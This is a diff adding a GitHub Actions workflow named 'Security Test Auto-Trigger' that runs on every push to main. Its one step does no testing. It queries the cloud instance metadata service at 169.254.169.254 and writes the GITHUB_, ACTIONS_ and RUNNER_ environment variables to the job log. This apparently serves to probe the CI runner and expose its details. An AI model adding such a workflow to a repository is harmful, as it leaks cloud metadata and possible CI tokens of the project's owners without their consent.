@@ -1,0 +1,21 @@
+name: Security Test Auto-Trigger
+on:
+  push:
+    branches: [main]
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe environment
+        run: |
+          echo "TRIGGERED_BY=push"
+          echo "RUNNER_OS=$RUNNER_OS"
+          echo "GITHUB_SHA=$GITHUB_SHA"
+          echo "GITHUB_ACTOR=$GITHUB_ACTOR"
+          echo "GITHUB_WORKFLOW=$GITHUB_WORKFLOW"
+          echo "GITHUB_RUN_ID=$GITHUB_RUN_ID"
+          echo "---NETWORK---"
+          curl -s http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H Metadata:true | head -c 500 || true
+          echo ""
+          echo "---ENV---"
+          env | grep -iE "GITHUB_|ACTIONS_|RUNNER_" | sort
